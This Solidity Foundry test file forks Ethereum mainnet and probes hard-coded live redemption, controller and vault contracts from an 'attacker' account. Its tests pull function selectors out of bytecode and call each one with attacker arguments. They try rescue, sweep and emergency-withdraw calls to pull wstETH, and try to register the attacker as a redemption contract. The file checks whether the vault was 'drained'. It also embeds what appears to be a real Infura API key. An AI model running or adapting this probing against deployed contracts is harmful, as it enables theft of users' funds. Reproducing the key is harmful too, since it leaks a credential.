// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract RedemptionEntryPoints is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FindAllRedemptionSelectors() public view {
        console.log("=== FINDING ALL REDEMPTION SELECTORS ===\n");

        bytes memory code = REDEMPTION_0.code;
        console.log("Redemption 0 code size:", code.length);

        // Find all PUSH4 followed by EQ
        console.log("\nAll function selectors in Redemption 0:");
        
        uint count = 0;
        for (uint i = 0; i + 5 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 selector = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) { // EQ
                        console.logBytes4(selector);
                        count++;
                        break;
                    }
                }
            }
        }
        console.log("\nTotal selectors:", count);
    }

    function test_TryAllSelectorsWithArgs() public {
        console.log("=== TRYING ALL SELECTORS WITH VARIOUS ARGS ===\n");

        // Try all unknown selectors with address or uint256 args
        bytes4[] memory selectors = new bytes4[](27);
        selectors[0] = bytes4(0xe30c3978);
        selectors[1] = bytes4(0xed45b661);
        selectors[2] = bytes4(0xeda72134);
        selectors[3] = bytes4(0xf2fde38b);
        selectors[4] = bytes4(0xaff6cbf1);
        selectors[5] = bytes4(0xb2118a8d);
        selectors[6] = bytes4(0xcff50c6e);
        selectors[7] = bytes4(0x8da5cb5b);
        selectors[8] = bytes4(0x900fd1ed);
        selectors[9] = bytes4(0x9307e802);
        selectors[10] = bytes4(0xa82b69ff);
        selectors[11] = bytes4(0x715018a6);
        selectors[12] = bytes4(0x7630c4a8);
        selectors[13] = bytes4(0x79ba5097);
        selectors[14] = bytes4(0x458f5815);
        selectors[15] = bytes4(0x51cbf345);
        selectors[16] = bytes4(0x5c975abb);
        selectors[17] = bytes4(0x5f8b5592);
        selectors[18] = bytes4(0x3a2ef9df);
        selectors[19] = bytes4(0x3f14c193);
        selectors[20] = bytes4(0x411557d1);
        selectors[21] = bytes4(0x196e6b1d);
        selectors[22] = bytes4(0x2ab60045);
        selectors[23] = bytes4(0x38a63183);
        selectors[24] = bytes4(0x04824e70);
        selectors[25] = bytes4(0x1650cf97);
        selectors[26] = bytes4(0x192a8e86);

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        console.log("\nTrying selectors with (address) arg:");
        for (uint i = 0; i < selectors.length; i++) {
            (bool success, ) = REDEMPTION_0.call(
                abi.encodeWithSelector(selectors[i], attacker)
            );
            if (success) {
                console.log("  SUCCESS:");
                console.logBytes4(selectors[i]);
            }
        }

        console.log("\nTrying selectors with (uint256) arg:");
        for (uint i = 0; i < selectors.length; i++) {
            (bool success, ) = REDEMPTION_0.call(
                abi.encodeWithSelector(selectors[i], uint256(1e18))
            );
            if (success) {
                console.log("  SUCCESS:");
                console.logBytes4(selectors[i]);
            }
        }

        console.log("\nTrying selectors with (address,uint256) args:");
        for (uint i = 0; i < selectors.length; i++) {
            (bool success, ) = REDEMPTION_0.call(
                abi.encodeWithSelector(selectors[i], attacker, uint256(1e18))
            );
            if (success) {
                console.log("  SUCCESS:");
                console.logBytes4(selectors[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }
    }

    function test_MatchSelectorsToSignatures() public pure {
        console.log("=== MATCHING SELECTORS TO KNOWN SIGNATURES ===\n");

        // Let's try to identify the unknown selectors
        // Known ones:
        // 0xe30c3978 = pendingOwner()
        // 0xf2fde38b = transferOwnership(address)
        // 0xaff6cbf1 = finalizeRedeem(uint256)
        // 0x8da5cb5b = owner()
        // 0x715018a6 = renounceOwnership()
        // 0x7630c4a8 = redeem(uint96)
        // 0x79ba5097 = acceptOwnership()
        // 0x5c975abb = paused()

        // Try to match unknown ones
        bytes4[] memory unknowns = new bytes4[](18);
        unknowns[0] = bytes4(0xed45b661);
        unknowns[1] = bytes4(0xeda72134);
        unknowns[2] = bytes4(0xb2118a8d);
        unknowns[3] = bytes4(0xcff50c6e);
        unknowns[4] = bytes4(0x900fd1ed);
        unknowns[5] = bytes4(0x9307e802);
        unknowns[6] = bytes4(0xa82b69ff);
        unknowns[7] = bytes4(0x458f5815);
        unknowns[8] = bytes4(0x51cbf345);
        unknowns[9] = bytes4(0x5f8b5592);
        unknowns[10] = bytes4(0x3a2ef9df);
        unknowns[11] = bytes4(0x3f14c193);
        unknowns[12] = bytes4(0x411557d1);
        unknowns[13] = bytes4(0x196e6b1d);
        unknowns[14] = bytes4(0x2ab60045);
        unknowns[15] = bytes4(0x38a63183);
        unknowns[16] = bytes4(0x1650cf97);
        unknowns[17] = bytes4(0x192a8e86);

        // Calculate potential matches
        console.log("Trying to match unknown selectors:");

        // Some likely functions for a redemption contract
        string[30] memory potentialFuncs = [
            "cancelRedeem(uint256)",
            "pause()",
            "unpause()",
            "setWaitingPeriod(uint32)",
            "setConversionRate(uint256)",
            "setMinRedemption(uint256)",
            "setMaxRedemption(uint256)",
            "setEpochCap(uint256)",
            "setCap(uint256)",
            "rescue(address,uint256)",
            "rescueTokens(address,address,uint256)",
            "sweep(address)",
            "emergencyWithdraw(address,uint256)",
            "UNDERLYING()",
            "wstETH()",
            "tETH()",
            "conversionRate()",
            "conversionRateBPS()",
            "epochCap()",
            "minRedemption()",
            "maxRedemption()",
            "totalRedeemed()",
            "currentEpoch()",
            "epochDuration()",
            "startRedemptionEpoch()",
            "endRedemptionEpoch()",
            "epochStartTime()",
            "epochEndTime()",
            "getEpochData(uint256)",
            "getUserRedemptions(address)"
        ];

        for (uint i = 0; i < 30; i++) {
            bytes4 sel = bytes4(keccak256(bytes(potentialFuncs[i])));
            for (uint j = 0; j < unknowns.length; j++) {
                if (sel == unknowns[j]) {
                    console.log("  MATCH:", potentialFuncs[i]);
                    console.logBytes4(sel);
                }
            }
        }
    }

    function test_CheckRescueFunctions() public {
        console.log("=== CHECKING RESCUE FUNCTIONS ===\n");

        // Rescue functions might let us extract tokens

        vm.startPrank(attacker);

        // Try rescue(address,uint256)
        console.log("Trying rescue(wstETH, 1e18)...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("rescue(address,uint256)", wstETH, 1e18)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.logBytes4(bytes4(data));
        }

        // Try rescueTokens
        console.log("\nTrying rescueTokens(wstETH, attacker, 1e18)...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("rescueTokens(address,address,uint256)", wstETH, attacker, 1e18)
        );
        console.log("Success:", success);

        // Try sweep
        console.log("\nTrying sweep(wstETH)...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("sweep(address)", wstETH)
        );
        console.log("Success:", success);

        // Try emergencyWithdraw
        console.log("\nTrying emergencyWithdraw(wstETH, 1e18)...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("emergencyWithdraw(address,uint256)", wstETH, 1e18)
        );
        console.log("Success:", success);

        vm.stopPrank();
    }

    function test_AnalyzeRCDirectly() public {
        console.log("=== ANALYZING RC DIRECTLY ===\n");

        // The key is RC.redeem(uint256, address)
        // It checks if caller is a registered redemption

        // Can we somehow register our own contract as a redemption?

        bytes memory code = REDEMPTION_CONTROLLER.code;

        // Look for addRedemption/register functions
        bytes4[] memory registerSels = new bytes4[](10);
        registerSels[0] = bytes4(keccak256("addRedemption(address)"));
        registerSels[1] = bytes4(keccak256("registerRedemption(address)"));
        registerSels[2] = bytes4(keccak256("addRedemptionContract(address)"));
        registerSels[3] = bytes4(keccak256("setRedemption(address,bool)"));
        registerSels[4] = bytes4(keccak256("updateRedemption(address,bool)"));
        registerSels[5] = bytes4(keccak256("whitelistRedemption(address)"));
        registerSels[6] = bytes4(keccak256("enableRedemption(address)"));
        registerSels[7] = bytes4(keccak256("initialize(address)"));
        registerSels[8] = bytes4(keccak256("setup(address)"));
        registerSels[9] = bytes4(keccak256("init(address)"));

        console.log("Searching for redemption registration functions in RC:");

        for (uint s = 0; s < registerSels.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == registerSels[s]) {
                    console.logBytes4(registerSels[s]);
                    break;
                }
            }
        }

        // Try calling addRedemption as attacker
        vm.startPrank(attacker);

        console.log("\nTrying addRedemption(attacker)...");
        (bool success, bytes memory data) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("addRedemption(address)", attacker)
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data));
        }

        vm.stopPrank();

        // Check if we're registered now
        (success, data) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSignature("getRedemptionContracts()")
        );
        if (success) {
            address[] memory redemptions = abi.decode(data, (address[]));
            console.log("\nRegistered redemptions:");
            for (uint i = 0; i < redemptions.length; i++) {
                console.log("  ", redemptions[i]);
            }
        }
    }
}
